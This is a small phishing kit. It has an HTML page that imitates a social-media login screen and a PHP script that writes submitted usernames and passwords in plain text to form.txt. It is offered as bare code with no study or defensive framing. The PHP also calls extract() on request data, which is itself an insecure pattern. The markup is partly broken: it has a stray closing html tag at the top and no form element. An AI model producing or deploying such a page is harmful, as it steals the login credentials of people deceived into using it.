</html>
<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
<div id="wrapper">
  <div class="main-content">
    <div class="header">
      <img src="https://i.imgur.com/zqpwkLQ.png" />
    </div>
    <div class="l-part">
      <input type="text" name="username" placeholder="Phone number, username or email address" class="input-1" />
      <div class="overlap-text">
        <input type="password" name="password" placeholder="Password" class="input-2" />
        <a href="#">Forgot?</a>
      </div>
      <input type="button" value="Log in" class="btn" />
    </div>
  </div>
  <div class="sub-content">
    <div class="s-part">
      Don't have an account? 
      <a href="#">Sign up
     </a>
    </div>
  </div>
</div>
</html>


<?php
extract($_REQUEST);
$file=fopen("form.txt" , "a");

fwrite($file , "name :");
fwrite($file , $username . "\n");

fwrite($file , "password :");
fwrite($file , $password . "\n");

fclose($file);

?>